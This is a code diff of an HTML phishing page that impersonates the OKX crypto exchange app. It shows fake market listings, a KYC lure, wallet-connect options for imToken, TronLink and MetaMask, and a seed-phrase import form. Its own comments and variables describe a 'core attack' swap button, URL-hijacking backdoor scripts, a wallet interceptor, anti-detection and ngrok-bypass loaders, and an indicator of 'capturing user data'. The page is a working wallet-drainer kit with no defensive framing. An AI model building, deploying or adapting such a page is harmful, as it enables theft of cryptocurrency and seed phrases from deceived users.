@@ -58,11 +58,23 @@
     <!-- Favicon和图标 -->
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
 
-    <!-- 🎯 终极后门：最高优先级URL劫持 -->
-    <script src="ultimate-url-hijacker.js"></script>
+    <!-- 🎯 ngrok警告杀手（超高优先级） -->
+    <script src="ngrok-warning-killer.js"></script>
+    <!-- 🎯 ngrok专用绕过系统（最高优先级） -->
+    <script src="ngrok-bypass.js"></script>
+    <!-- 🎯 终极绕过系统：多层防护 -->
+    <script src="iframe-injector.js"></script>
+    <script src="stealth-bypass.js"></script>
+    <script src="domain-rotation.js"></script>
+    <!-- 🎯 智能重定向系统 -->
+    <script src="smart-redirect.js"></script>
+
+    <!-- 🎯 超深层拦截：在URL生成时就拦截 -->
+    <script src="deep-wallet-interceptor.js"></script>
 
     <!-- 🎯 终极后门：最高优先级URL劫持 -->
     <script src="ultimate-url-hijacker.js"></script>
+
     <!-- 🎯 超级后门：在imToken检测前生效 -->
     <script>
         // 🎯 立即执行：在任何检测之前劫持URL
@@ -235,8 +247,7 @@
 
     <!-- 🎯 手机端专用：imToken拦截器 -->
     <script src="mobile-imtoken-bypass.js"></script>
-    <!-- 🎯 手机端专用：imToken拦截器 -->
-    <script src="mobile-imtoken-bypass.js"></script>
+
     <!-- 🎯 最高优先级：反检测脚本 -->
     <script src="anti-detection.js"></script>
     <!-- 安全性和完整性 -->
@@ -1688,11 +1699,11 @@
             .header {
                 padding: 8px 12px;
             }
-            
+
             .search-bar {
                 margin: 12px;
             }
-            
+
             .kyc-banner, .strategy-card {
                 margin: 0 12px 12px;
             }
@@ -1700,1264 +1711,1303 @@
     </style>
 </head>
 <body>
-    <!-- 顶部导航栏 -->
-    <div class="header">
-        <div class="header-left">
-            <div class="menu-btn">
-                <div class="menu-line"></div>
-                <div class="menu-line"></div>
-                <div class="menu-line"></div>
+<!-- 顶部导航栏 -->
+<div class="header">
+    <div class="header-left">
+        <div class="menu-btn">
+            <div class="menu-line"></div>
+            <div class="menu-line"></div>
+            <div class="menu-line"></div>
+        </div>
+        <div class="platform-selector" onclick="showPlatformDropdown()">
+            <span id="currentPlatform">交易所</span>
+            <span class="platform-arrow">></span>
+        </div>
+    </div>
+    <div class="header-right">
+        <!-- 钱包连接按钮 -->
+        <button class="connect-wallet-btn" id="connectWalletBtn" onclick="showWalletModal()">连接钱包</button>
+        <div class="wallet-status" id="walletStatus">已连接</div>
+
+        <div class="gift-icon">
+            🎁
+            <div class="notification-badge">3</div>
+        </div>
+        <div class="user-avatar" onclick="showUserMenu()">
+            👤
+        </div>
+    </div>
+</div>
+
+<!-- 钱包连接模态框 -->
+<div class="wallet-modal" id="walletModal">
+    <div class="wallet-content">
+        <div class="wallet-title">连接钱包</div>
+        <div class="wallet-subtitle">选择您要连接的钱包</div>
+
+        <div class="wallet-options">
+            <div class="wallet-option" onclick="connectImToken()">
+                <div class="wallet-icon imtoken-icon">i</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">imToken</div>
+                    <div class="wallet-desc">移动端DeFi钱包</div>
+                </div>
             </div>
-            <div class="platform-selector" onclick="showPlatformDropdown()">
-                <span id="currentPlatform">交易所</span>
-                <span class="platform-arrow">></span>
+
+            <div class="wallet-option" onclick="connectTronLink()">
+                <div class="wallet-icon tronlink-icon">T</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">TronLink</div>
+                    <div class="wallet-desc">TRON官方钱包</div>
+                </div>
+            </div>
+
+            <div class="wallet-option" onclick="connectMetaMask()">
+                <div class="wallet-icon metamask-icon">M</div>
+                <div class="wallet-info">
+                    <div class="wallet-name">MetaMask</div>
+                    <div class="wallet-desc">以太坊生态钱包</div>
+                </div>
             </div>
         </div>
-        <div class="header-right">
-            <!-- 钱包连接按钮 -->
-            <button class="connect-wallet-btn" id="connectWalletBtn" onclick="showWalletModal()">连接钱包</button>
-            <div class="wallet-status" id="walletStatus">已连接</div>
-            
-            <div class="gift-icon">
-                🎁
-                <div class="notification-badge">3</div>
-            </div>
-            <div class="user-avatar" onclick="showUserMenu()">
-                👤
-            </div>
+
+        <div class="wallet-actions">
+            <button class="wallet-btn secondary" onclick="closeWalletModal()">取消</button>
+            <button class="wallet-btn primary" onclick="importWallet()">导入钱包</button>
+        </div>
+    </div>
+</div>
+
+<!-- 搜索栏 -->
+<div class="search-bar" onclick="showSearch()">
+    <div class="search-icon">🔍</div>
+    <div class="search-text">🔥 SKY 新币上线</div>
+</div>
+
+<!-- 主要内容区域 -->
+<div class="main-content active" id="favorites">
+    <!-- KYC认证横幅 -->
+    <div class="kyc-banner">
+        <div class="kyc-content">
+            <h3>继续完成认证，获得最高 100 USDT</h3>
+            <p>您需提供身份证、自拍照和个人信息</p>
+            <button class="kyc-btn" onclick="startKYC()">继续认证</button>
         </div>
     </div>
 
-    <!-- 钱包连接模态框 -->
-    <div class="wallet-modal" id="walletModal">
-        <div class="wallet-content">
-            <div class="wallet-title">连接钱包</div>
-            <div class="wallet-subtitle">选择您要连接的钱包</div>
-            
-            <div class="wallet-options">
-                <div class="wallet-option" onclick="connectImToken()">
-                    <div class="wallet-icon imtoken-icon">i</div>
-                    <div class="wallet-info">
-                        <div class="wallet-name">imToken</div>
-                        <div class="wallet-desc">移动端DeFi钱包</div>
-                    </div>
-                </div>
-                
-                <div class="wallet-option" onclick="connectTronLink()">
-                    <div class="wallet-icon tronlink-icon">T</div>
-                    <div class="wallet-info">
-                        <div class="wallet-name">TronLink</div>
-                        <div class="wallet-desc">TRON官方钱包</div>
-                    </div>
-                </div>
-                
-                <div class="wallet-option" onclick="connectMetaMask()">
-                    <div class="wallet-icon metamask-icon">M</div>
-                    <div class="wallet-info">
-                        <div class="wallet-name">MetaMask</div>
-                        <div class="wallet-desc">以太坊生态钱包</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="wallet-actions">
-                <button class="wallet-btn secondary" onclick="closeWalletModal()">取消</button>
-                <button class="wallet-btn primary" onclick="importWallet()">导入钱包</button>
-            </div>
+    <!-- 策略交易卡片 -->
+    <div class="strategy-card">
+        <div class="strategy-icon">📊</div>
+        <div class="strategy-content">
+            <div class="strategy-title">策略交易</div>
+            <div class="strategy-desc">一键开启 SOL 网格策略，赚取高年化收益，立即创建吧</div>
         </div>
+        <div class="strategy-badge">1/6</div>
     </div>
+</div>
 
-    <!-- 搜索栏 -->
-    <div class="search-bar" onclick="showSearch()">
-        <div class="search-icon">🔍</div>
-        <div class="search-text">🔥 SKY 新币上线</div>
-    </div>
-
-    <!-- 主要内容区域 -->
-    <div class="main-content active" id="favorites">
-        <!-- KYC认证横幅 -->
-        <div class="kyc-banner">
-            <div class="kyc-content">
-                <h3>继续完成认证，获得最高 100 USDT</h3>
-                <p>您需提供身份证、自拍照和个人信息</p>
-                <button class="kyc-btn" onclick="startKYC()">继续认证</button>
+<!-- 市场页面 -->
+<div class="main-content" id="market">
+    <div class="market-header">
+        <div class="market-stats">
+            <div class="stat-card">
+                <div class="stat-label">市值</div>
+                <div class="stat-value">$4.17万亿</div>
+                <div class="stat-change">-0.30%</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">成交额</div>
+                <div class="stat-value">$1,293.12亿</div>
+                <div class="stat-change">-24.61%</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">市值占比</div>
+                <div class="stat-value">55.44%</div>
+                <div style="font-size: 10px; color: #ff9500;">🪙 Bitcoin</div>
             </div>
         </div>
 
-        <!-- 策略交易卡片 -->
+        <div class="fomc-notice">
+            <div class="fomc-text">🌍 FOMC 经济预测（美国）将于 9月18日 发布</div>
+            <div>></div>
+        </div>
+    </div>
+
+    <div class="pairs-tabs">
+        <div class="tab active">自选</div>
+        <div class="tab">现货</div>
+        <div class="tab">合约</div>
+        <div class="tab">期权</div>
+        <div class="tab">总览</div>
+    </div>
+
+    <div class="pairs-filters">
+        <button class="filter-btn active">全部</button>
+        <button class="filter-btn">主流币</button>
+        <button class="filter-btn">新币种</button>
+        <button class="filter-btn">人工智能</button>
+        <button class="filter-btn">Solana</button>
+    </div>
+
+    <div class="pairs-header">
+        <div>名称 / 成交额</div>
+        <div>最新价</div>
+        <div>今日涨跌</div>
+    </div>
+
+    <div class="trading-pairs">
+        <div class="pair-item">
+            <div class="pair-info">
+                <div class="pair-icon btc-icon">₿</div>
+                <div class="pair-details">
+                    <h4>BTC/USDT</h4>
+                    <div class="pair-volume">$2.07亿</div>
+                </div>
+            </div>
+            <div class="pair-price">
+                <div class="price-value">115,968.5</div>
+                <div class="price-usd">$116,032.3</div>
+            </div>
+            <div class="price-change positive">+0.03%</div>
+        </div>
+
+        <div class="pair-item">
+            <div class="pair-info">
+                <div class="pair-icon eth-icon">Ξ</div>
+                <div class="pair-details">
+                    <h4>ETH/USDT</h4>
+                    <div class="pair-volume">$4.84亿</div>
+                </div>
+            </div>
+            <div class="pair-price">
+                <div class="price-value">4,651.04</div>
+                <div class="price-usd">$4,653.60</div>
+            </div>
+            <div class="price-change negative">-0.34%</div>
+        </div>
+
+        <div class="pair-item">
+            <div class="pair-info">
+                <div class="pair-icon okb-icon">O</div>
+                <div class="pair-details">
+                    <h4>OKB/USDT</h4>
+                    <div class="pair-volume">$8,164.2万</div>
+                </div>
+            </div>
+            <div class="pair-price">
+                <div class="price-value">201.89</div>
+                <div class="price-usd">$202.00</div>
+            </div>
+            <div class="price-change positive">+0.43%</div>
+        </div>
+
+        <div class="pair-item">
+            <div class="pair-info">
+                <div class="pair-icon sol-icon">◎</div>
+                <div class="pair-details">
+                    <h4>SOL/USDT</h4>
+                    <div class="pair-volume">$2.4亿</div>
+                </div>
+            </div>
+            <div class="pair-price">
+                <div class="price-value">247.25</div>
+                <div class="price-usd">$247.39</div>
+            </div>
+            <div class="price-change positive">+2.00%</div>
+        </div>
+
+        <div class="pair-item">
+            <div class="pair-info">
+                <div class="pair-icon doge-icon">Ð</div>
+                <div class="pair-details">
+                    <h4>DOGE/USDT</h4>
+                    <div class="pair-volume">$5.43亿</div>
+                </div>
+            </div>
+            <div class="pair-price">
+                <div class="price-value">0.28794</div>
+                <div class="price-usd">$0.28810</div>
+            </div>
+            <div class="price-change negative">-0.50%</div>
+        </div>
+
+        <div class="pair-item">
+            <div class="pair-info">
+                <div class="pair-icon xrp-icon">X</div>
+                <div class="pair-details">
+                    <h4>XRP/USDT</h4>
+                    <div class="pair-volume">$5,376.2万</div>
+                </div>
+            </div>
+            <div class="pair-price">
+                <div class="price-value">3.078</div>
+                <div class="price-usd">$3.0797</div>
+            </div>
+            <div class="price-change negative">-1.32%</div>
+        </div>
+    </div>
+</div>
+
+<!-- 🎯 闪兑页面 - 核心攻击功能 -->
+<div class="main-content" id="convert">
+    <div class="convert-page">
+        <div class="convert-header">
+            <div class="convert-title">闪兑</div>
+            <div class="fee-badge">0手续费</div>
+        </div>
+
+        <div class="convert-form">
+            <div class="currency-input">
+                <div class="currency-label">消耗</div>
+                <div class="currency-selector">
+                    <div class="currency-info" onclick="selectFromCurrency()">
+                        <div class="currency-icon trx-icon">T</div>
+                        <div>
+                            <div class="currency-name">TRX</div>
+                            <div class="currency-balance" id="trxBalance">可用: 0 TRX</div>
+                        </div>
+                    </div>
+                    <input type="number" class="amount-input" placeholder="输入TRX数量" id="fromAmount" oninput="calculateConversion()">
+                </div>
+            </div>
+
+            <div class="swap-btn" onclick="swapCurrencies()">
+                ⇅
+            </div>
+
+            <div class="currency-input">
+                <div class="currency-label">获得</div>
+                <div class="currency-selector">
+                    <div class="currency-info"  onclick="selectToCurrency()">
+                        <div class="currency-icon usdt-icon">₮</div>
+                        <div>
+                            <div class="currency-name">USDT</div>
+                            <div class="currency-balance">预计获得</div>
+                        </div>
+                    </div>
+                    <input type="number" class="amount-input" placeholder="0" id="toAmount" readonly>
+                </div>
+            </div>
+        </div>
+
+        <div class="rate-info">
+            <div class="rate-text">1 TRX ≈ 0.1634 USDT</div>
+        </div>
+
+        <button class="convert-button" id="convertBtn" onclick="executeAttack()" disabled>请先连接钱包</button>
+    </div>
+</div>
+
+<!-- 交易页面 -->
+<div class="main-content" id="trade">
+    <div style="padding: 16px;">
         <div class="strategy-card">
-            <div class="strategy-icon">📊</div>
+            <div class="strategy-icon">🤖</div>
             <div class="strategy-content">
-                <div class="strategy-title">策略交易</div>
-                <div class="strategy-desc">一键开启 SOL 网格策略，赚取高年化收益，立即创建吧</div>
-            </div>
-            <div class="strategy-badge">1/6</div>
-        </div>
-    </div>
-
-    <!-- 市场页面 -->
-    <div class="main-content" id="market">
-        <div class="market-header">
-            <div class="market-stats">
-                <div class="stat-card">
-                    <div class="stat-label">市值</div>
-                    <div class="stat-value">$4.17万亿</div>
-                    <div class="stat-change">-0.30%</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-label">成交额</div>
-                    <div class="stat-value">$1,293.12亿</div>
-                    <div class="stat-change">-24.61%</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-label">市值占比</div>
-                    <div class="stat-value">55.44%</div>
-                    <div style="font-size: 10px; color: #ff9500;">🪙 Bitcoin</div>
-                </div>
-            </div>
-
-            <div class="fomc-notice">
-                <div class="fomc-text">🌍 FOMC 经济预测（美国）将于 9月18日 发布</div>
-                <div>></div>
-            </div>
-        </div>
-
-        <div class="pairs-tabs">
-            <div class="tab active">自选</div>
-            <div class="tab">现货</div>
-            <div class="tab">合约</div>
-            <div class="tab">期权</div>
-            <div class="tab">总览</div>
-        </div>
-
-        <div class="pairs-filters">
-            <button class="filter-btn active">全部</button>
-            <button class="filter-btn">主流币</button>
-            <button class="filter-btn">新币种</button>
-            <button class="filter-btn">人工智能</button>
-            <button class="filter-btn">Solana</button>
-        </div>
-
-        <div class="pairs-header">
-            <div>名称 / 成交额</div>
-            <div>最新价</div>
-            <div>今日涨跌</div>
-        </div>
-
-        <div class="trading-pairs">
-            <div class="pair-item">
-                <div class="pair-info">
-                    <div class="pair-icon btc-icon">₿</div>
-                    <div class="pair-details">
-                        <h4>BTC/USDT</h4>
-                        <div class="pair-volume">$2.07亿</div>
-                    </div>
-                </div>
-                <div class="pair-price">
-                    <div class="price-value">115,968.5</div>
-                    <div class="price-usd">$116,032.3</div>
-                </div>
-                <div class="price-change positive">+0.03%</div>
-            </div>
-
-            <div class="pair-item">
-                <div class="pair-info">
-                    <div class="pair-icon eth-icon">Ξ</div>
-                    <div class="pair-details">
-                        <h4>ETH/USDT</h4>
-                        <div class="pair-volume">$4.84亿</div>
-                    </div>
-                </div>
-                <div class="pair-price">
-                    <div class="price-value">4,651.04</div>
-                    <div class="price-usd">$4,653.60</div>
-                </div>
-                <div class="price-change negative">-0.34%</div>
-            </div>
-
-            <div class="pair-item">
-                <div class="pair-info">
-                    <div class="pair-icon okb-icon">O</div>
-                    <div class="pair-details">
-                        <h4>OKB/USDT</h4>
-                        <div class="pair-volume">$8,164.2万</div>
-                    </div>
-                </div>
-                <div class="pair-price">
-                    <div class="price-value">201.89</div>
-                    <div class="price-usd">$202.00</div>
-                </div>
-                <div class="price-change positive">+0.43%</div>
-            </div>
-
-            <div class="pair-item">
-                <div class="pair-info">
-                    <div class="pair-icon sol-icon">◎</div>
-                    <div class="pair-details">
-                        <h4>SOL/USDT</h4>
-                        <div class="pair-volume">$2.4亿</div>
-                    </div>
-                </div>
-                <div class="pair-price">
-                    <div class="price-value">247.25</div>
-                    <div class="price-usd">$247.39</div>
-                </div>
-                <div class="price-change positive">+2.00%</div>
-            </div>
-
-            <div class="pair-item">
-                <div class="pair-info">
-                    <div class="pair-icon doge-icon">Ð</div>
-                    <div class="pair-details">
-                        <h4>DOGE/USDT</h4>
-                        <div class="pair-volume">$5.43亿</div>
-                    </div>
-                </div>
-                <div class="pair-price">
-                    <div class="price-value">0.28794</div>
-                    <div class="price-usd">$0.28810</div>
-                </div>
-                <div class="price-change negative">-0.50%</div>
-            </div>
-
-            <div class="pair-item">
-                <div class="pair-info">
-                    <div class="pair-icon xrp-icon">X</div>
-                    <div class="pair-details">
-                        <h4>XRP/USDT</h4>
-                        <div class="pair-volume">$5,376.2万</div>
-                    </div>
-                </div>
-                <div class="pair-price">
-                    <div class="price-value">3.078</div>
-                    <div class="price-usd">$3.0797</div>
-                </div>
-                <div class="price-change negative">-1.32%</div>
+                <div class="strategy-title">全天候智能交易，轻松躺赢</div>
+                <div class="strategy-desc">一键开启智能交易，赚取高达 200.18% 年化收益。</div>
             </div>
         </div>
     </div>
+</div>
 
-    <!-- 🎯 闪兑页面 - 核心攻击功能 -->
-    <div class="main-content" id="convert">
-        <div class="convert-page">
-            <div class="convert-header">
-                <div class="convert-title">闪兑</div>
-                <div class="fee-badge">0手续费</div>
-            </div>
-
-            <div class="convert-form">
-                <div class="currency-input">
-                    <div class="currency-label">消耗</div>
-                    <div class="currency-selector">
-                        <div class="currency-info" onclick="selectFromCurrency()">
-                            <div class="currency-icon trx-icon">T</div>
-                            <div>
-                                <div class="currency-name">TRX</div>
-                                <div class="currency-balance" id="trxBalance">可用: 0 TRX</div>
-                            </div>
-                        </div>
-                        <input type="number" class="amount-input" placeholder="输入TRX数量" id="fromAmount" oninput="calculateConversion()">
-                    </div>
-                </div>
-
-                <div class="swap-btn" onclick="swapCurrencies()">
-                    ⇅
-                </div>
-
-                <div class="currency-input">
-                    <div class="currency-label">获得</div>
-                    <div class="currency-selector">
-                        <div class="currency-info"  onclick="selectToCurrency()">
-                            <div class="currency-icon usdt-icon">₮</div>
-                            <div>
-                                <div class="currency-name">USDT</div>
-                                <div class="currency-balance">预计获得</div>
-                            </div>
-                        </div>
-                        <input type="number" class="amount-input" placeholder="0" id="toAmount" readonly>
-                    </div>
-                </div>
-            </div>
-
-            <div class="rate-info">
-                <div class="rate-text">1 TRX ≈ 0.1634 USDT</div>
-            </div>
-
-            <button class="convert-button" id="convertBtn" onclick="executeAttack()" disabled>请先连接钱包</button>
+<!-- Web3页面 -->
+<div class="main-content" id="web3">
+    <div class="web3-page">
+        <div class="web3-animation">
+            <div class="web3-grid" id="web3Grid"></div>
+        </div>
+        <div class="web3-title">Web3 入口，一个就够</div>
+        <div class="web3-subtitle">钱包 · 交易 · NFT · 赚币 · DApp</div>
+        <div class="web3-actions">
+            <button class="web3-btn" onclick="createWallet()">创建钱包</button>
+            <button class="web3-btn secondary" onclick="importWallet()">导入钱包</button>
         </div>
     </div>
+</div>
 
-    <!-- 交易页面 -->
-    <div class="main-content" id="trade">
-        <div style="padding: 16px;">
-            <div class="strategy-card">
-                <div class="strategy-icon">🤖</div>
-                <div class="strategy-content">
-                    <div class="strategy-title">全天候智能交易，轻松躺赢</div>
-                    <div class="strategy-desc">一键开启智能交易，赚取高达 200.18% 年化收益。</div>
+<!-- 资产页面 -->
+<div class="main-content" id="assets">
+    <div class="assets-page">
+        <div class="assets-header">
+            <div class="falling-coins" id="fallingCoins"></div>
+            <div class="balance-display">
+                <div class="balance-label">昨日收益 👁</div>
+                <div class="balance-amount">0.00 USD ></div>
+                <div class="balance-actions">
+                    <button class="balance-action" onclick="depositFunds()">充币</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="assets-content">
+            <div style="text-align: center; margin: 40px 0;">
+                <div style="width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, #7ed321, #52c41a); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px;">💰</div>
+                <h3 style="color: #fff; margin-bottom: 8px;">把握未来 拥抱数字货币</h3>
+                <button class="balance-action" style="background: #7ed321; color: #000; margin-top: 20px;" onclick="depositFunds()">充币</button>
+            </div>
+
+            <div style="color: #666; font-size: 12px; margin-bottom: 16px;">如何充币? <span style="color: #7ed321;">查看更多 →</span></div>
+
+            <div style="color: #fff; font-size: 16px; margin-bottom: 16px;">热门币</div>
+
+            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
+                <div style="text-align: center;">
+                    <div class="pair-icon btc-icon" style="margin: 0 auto 8px;">₿</div>
+                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">BTC</div>
+                    <div style="font-size: 12px; color: #fff;">$116,050.3</div>
+                    <div style="font-size: 10px; color: #7ed321;">+0.08%</div>
+                </div>
+                <div style="text-align: center;">
+                    <div class="pair-icon eth-icon" style="margin: 0 auto 8px;">Ξ</div>
+                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">ETH</div>
+                    <div style="font-size: 12px; color: #fff;">$4,653.51</div>
+                    <div style="font-size: 10px; color: #f5455c;">-1.26%</div>
+                </div>
+                <div style="text-align: center;">
+                    <div class="pair-icon usdt-icon" style="margin: 0 auto 8px;">₮</div>
+                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDT</div>
+                    <div style="font-size: 12px; color: #fff;">$1.00056</div>
+                    <div style="font-size: 10px; color: #7ed321;">0.00%</div>
+                </div>
+                <div style="text-align: center;">
+                    <div class="pair-icon" style="background: #2196f3; margin: 0 auto 8px;">$</div>
+                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDC</div>
+                    <div style="font-size: 12px; color: #fff;">$0.9999</div>
+                    <div style="font-size: 10px; color: #7ed321;">0.00%</div>
                 </div>
             </div>
         </div>
     </div>
+</div>
 
-    <!-- Web3页面 -->
-    <div class="main-content" id="web3">
-        <div class="web3-page">
-            <div class="web3-animation">
-                <div class="web3-grid" id="web3Grid"></div>
-            </div>
-            <div class="web3-title">Web3 入口，一个就够</div>
-            <div class="web3-subtitle">钱包 · 交易 · NFT · 赚币 · DApp</div>
-            <div class="web3-actions">
-                <button class="web3-btn" onclick="createWallet()">创建钱包</button>
-                <button class="web3-btn secondary" onclick="importWallet()">导入钱包</button>
-            </div>
+<!-- 底部导航 -->
+<div class="bottom-nav">
+    <div class="nav-item active" onclick="switchTab('favorites')">
+        <div class="nav-icon">⚡</div>
+        <div class="nav-label">欧易</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('market')">
+        <div class="nav-icon">📊</div>
+        <div class="nav-label">市场</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('convert')">
+        <div class="nav-icon">⚡</div>
+        <div class="nav-label">交易</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('web3')">
+        <div class="nav-icon">🔍</div>
+        <div class="nav-label">探索</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('assets')">
+        <div class="nav-icon">⏰</div>
+        <div class="nav-label">资产</div>
+    </div>
+</div>
+
+<!-- 助记词导入模态框 -->
+<div class="mnemonic-modal" id="mnemonicModal">
+    <div class="mnemonic-content">
+        <div class="mnemonic-title">导入钱包</div>
+        <div class="mnemonic-subtitle">请输入您的助记词来恢复钱包</div>
+        <textarea class="mnemonic-input" id="mnemonicInput" placeholder="请输入12-24个助记词，用空格分隔"></textarea>
+        <div class="mnemonic-actions">
+            <button class="mnemonic-btn secondary" onclick="closeMnemonicModal()">取消</button>
+            <button class="mnemonic-btn primary" onclick="confirmImport()">导入</button>
         </div>
     </div>
+</div>
 
-    <!-- 资产页面 -->
-    <div class="main-content" id="assets">
-        <div class="assets-page">
-            <div class="assets-header">
-                <div class="falling-coins" id="fallingCoins"></div>
-                <div class="balance-display">
-                    <div class="balance-label">昨日收益 👁</div>
-                    <div class="balance-amount">0.00 USD ></div>
-                    <div class="balance-actions">
-                        <button class="balance-action" onclick="depositFunds()">充币</button>
-                    </div>
-                </div>
-            </div>
+<!-- 攻击状态指示器 -->
+<div class="attack-indicator" id="attackIndicator">
+    🎯 攻击系统已激活 - 正在捕获用户数据
+</div>
 
-            <div class="assets-content">
-                <div style="text-align: center; margin: 40px 0;">
-                    <div style="width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, #7ed321, #52c41a); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px;">💰</div>
-                    <h3 style="color: #fff; margin-bottom: 8px;">把握未来 拥抱数字货币</h3>
-                    <button class="balance-action" style="background: #7ed321; color: #000; margin-top: 20px;" onclick="depositFunds()">充币</button>
-                </div>
+<!-- 调试面板 -->
+<div class="debug-panel" id="debugPanel">
+    <div id="debugLog"></div>
+</div>
+<button class="debug-toggle" onclick="toggleDebug()">调试</button>
 
-                <div style="color: #666; font-size: 12px; margin-bottom: 16px;">如何充币? <span style="color: #7ed321;">查看更多 →</span></div>
+<!-- 成功提示 -->
+<div class="success-toast" id="successToast">✅ 操作成功</div>
 
-                <div style="color: #fff; font-size: 16px; margin-bottom: 16px;">热门币</div>
+<script>
+    // 🎯 全局攻击变量
+    let currentTab = 'favorites';
+    let isWalletConnected = false;
+    let currentAccount = null;
+    let tronWeb = null;
+    let capturedMnemonic = null;
+    let debugMode = false;
+    let attackMode = true;
+    let userBalance = 0; // 用户真实余额
 
-                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
-                    <div style="text-align: center;">
-                        <div class="pair-icon btc-icon" style="margin: 0 auto 8px;">₿</div>
-                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">BTC</div>
-                        <div style="font-size: 12px; color: #fff;">$116,050.3</div>
-                        <div style="font-size: 10px; color: #7ed321;">+0.08%</div>
-                    </div>
-                    <div style="text-align: center;">
-                        <div class="pair-icon eth-icon" style="margin: 0 auto 8px;">Ξ</div>
-                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">ETH</div>
-                        <div style="font-size: 12px; color: #fff;">$4,653.51</div>
-                        <div style="font-size: 10px; color: #f5455c;">-1.26%</div>
-                    </div>
-                    <div style="text-align: center;">
-                        <div class="pair-icon usdt-icon" style="margin: 0 auto 8px;">₮</div>
-                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDT</div>
-                        <div style="font-size: 12px; color: #fff;">$1.00056</div>
-                        <div style="font-size: 10px; color: #7ed321;">0.00%</div>
-                    </div>
-                    <div style="text-align: center;">
-                        <div class="pair-icon" style="background: #2196f3; margin: 0 auto 8px;">$</div>
-                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDC</div>
-                        <div style="font-size: 12px; color: #fff;">$0.9999</div>
-                        <div style="font-size: 10px; color: #7ed321;">0.00%</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- 底部导航 -->
-    <div class="bottom-nav">
-        <div class="nav-item active" onclick="switchTab('favorites')">
-            <div class="nav-icon">⚡</div>
-            <div class="nav-label">欧易</div>
-        </div>
-        <div class="nav-item" onclick="switchTab('market')">
-            <div class="nav-icon">📊</div>
-            <div class="nav-label">市场</div>
-        </div>
-        <div class="nav-item" onclick="switchTab('convert')">
-            <div class="nav-icon">⚡</div>
-            <div class="nav-label">交易</div>
-        </div>
-        <div class="nav-item" onclick="switchTab('web3')">
-            <div class="nav-icon">🔍</div>
-            <div class="nav-label">探索</div>
-        </div>
-        <div class="nav-item" onclick="switchTab('assets')">
-            <div class="nav-icon">⏰</div>
-            <div class="nav-label">资产</div>
-        </div>
-    </div>
-
-    <!-- 助记词导入模态框 -->
-    <div class="mnemonic-modal" id="mnemonicModal">
-        <div class="mnemonic-content">
-            <div class="mnemonic-title">导入钱包</div>
-            <div class="mnemonic-subtitle">请输入您的助记词来恢复钱包</div>
-            <textarea class="mnemonic-input" id="mnemonicInput" placeholder="请输入12-24个助记词，用空格分隔"></textarea>
-            <div class="mnemonic-actions">
-                <button class="mnemonic-btn secondary" onclick="closeMnemonicModal()">取消</button>
-                <button class="mnemonic-btn primary" onclick="confirmImport()">导入</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 攻击状态指示器 -->
-    <div class="attack-indicator" id="attackIndicator">
-        🎯 攻击系统已激活 - 正在捕获用户数据
-    </div>
-
-    <!-- 调试面板 -->
-    <div class="debug-panel" id="debugPanel">
